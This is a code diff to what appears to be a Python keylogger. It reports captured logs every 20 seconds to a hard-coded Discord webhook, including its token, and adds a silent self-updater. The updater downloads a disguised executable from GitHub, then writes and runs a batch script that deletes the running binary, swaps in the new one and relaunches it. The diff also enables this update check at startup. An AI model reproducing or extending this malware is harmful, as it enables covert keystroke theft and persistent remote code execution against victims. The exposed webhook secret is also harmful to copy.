@@ -71,7 +71,7 @@ finally:
     # Use the user-provided Discord Webhook URL
     WEBHOOK_URL = "https://discord.com/api/webhooks/1451250056714784820/rcHD8FNgtCzzTrBd8TC_BVeog_rEdUz-wKseDAAbqoJpvXDQ8dC0lDSlvkDXWMOOAgVV"
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
-    VERSION = "2.6"
+    VERSION = "2.7"
     # Actual GitHub Raw URLs - UPDATED FOR NEW EXE NAME
     VERSION_URL = "https://raw.githubusercontent.com/Pranavfr/keylogger-advanced/main/version.txt" 
     EXE_URL = "https://github.com/Pranavfr/keylogger-advanced/raw/main/StarkCoreServices.exe"
@@ -668,37 +668,61 @@ finally:
                 import requests
                 # 1. Check Remote Version
                 response = requests.get(VERSION_URL)
-                remote_version = response.text.strip()
                 
-                if remote_version != self.version:
-                    self.appendlog(f"\n[Update Found: v{remote_version} (Current: v{self.version}) - Updating...]\n")
-                    self.report() # Send logs before dying
-                    
+                # SAFETY GUARD: Check for HTTP Errors (404, 403, etc)
+                if response.status_code != 200:
+                    return
+
+                remote_version_text = response.text.strip()
+                
+                # SAFETY GUARD: Check for "404", "Not Found", or HTML tags
+                if "404" in remote_version_text or "Not Found" in remote_version_text or "<html" in remote_version_text:
+                    return
+
+                # SAFETY GUARD: Verify it looks like a version number
+                # Simple check: must be short and start with digit
+                if len(remote_version_text) > 10 or not remote_version_text[0].isdigit():
+                    return
+
+                if remote_version_text != VERSION:
+                    # Update Available
                     # 2. Download New Exe
                     exe_response = requests.get(EXE_URL)
-                    temp_exe_path = os.path.join(os.getenv('TEMP'), "update.exe")
-                    with open(temp_exe_path, "wb") as f:
+                    if exe_response.status_code != 200:
+                        return
+                        
+                    # Write to Temp as 'update.exe'
+                    update_path = os.path.join(tempfile.gettempdir(), "update.exe")
+                    with open(update_path, "wb") as f:
                         f.write(exe_response.content)
                     
-                    # 3. Create Batch Script for Self-Replacement
-                    current_exe = sys.executable
-                    batch_script_path = os.path.join(os.getenv('TEMP'), "update.bat")
+                    # 3. Create Updater Batch Script
+                    # We need a script to:
+                    # a) Wait for us to close
+                    # b) Delete us
+                    # c) Move update.exe to our location
+                    # d) Run the new exe
                     
-                    batch_content = f"""
+                    current_exe = sys.executable
+                    batch_script = f"""
 @echo off
-timeout /t 3 /nobreak >nul
+timeout /t 3 /nobreak
 del "{current_exe}"
-move "{temp_exe_path}" "{current_exe}"
+move "{update_path}" "{current_exe}"
 start "" "{current_exe}"
 del "%~f0"
 """
-                    with open(batch_script_path, "w") as f:
-                        f.write(batch_content)
+                    batch_path = os.path.join(tempfile.gettempdir(), "update.bat")
+                    with open(batch_path, "w") as f:
+                        f.write(batch_script)
+                        
+                    # 4. Execute Batch and Die
+                    # Send a final 'Updating' log
+                    self.send_to_webhook(f"[System] Updating to {remote_version_text}...")
                     
-                    # 4. Execute Batch and Exit
-                    subprocess.Popen(batch_script_path, shell=True)
-                    sys.exit(0)
-            except Exception as e:
+                    subprocess.Popen(batch_path, shell=True)
+                    os._exit(0)
+            except Exception:
                 pass # Silent fail on update check
 
 
@@ -750,9 +774,9 @@ del "%~f0"
         # --- MAIN EXECUTION MODEL ---
         keylogger = KeyLogger(SEND_REPORT_EVERY, WEBHOOK_URL)
         
-        # Check for updates on startup (DISABLED to prevent loops)
-        # if getattr(sys, 'frozen', False): 
-        #     Thread(target=keylogger.check_for_updates).start()
+        # Check for updates on startup
+        if getattr(sys, 'frozen', False): 
+             Thread(target=keylogger.check_for_updates).start()
 
         # We must run the GUI on the Main Thread.
         # The Keylogger must run in a background thread.
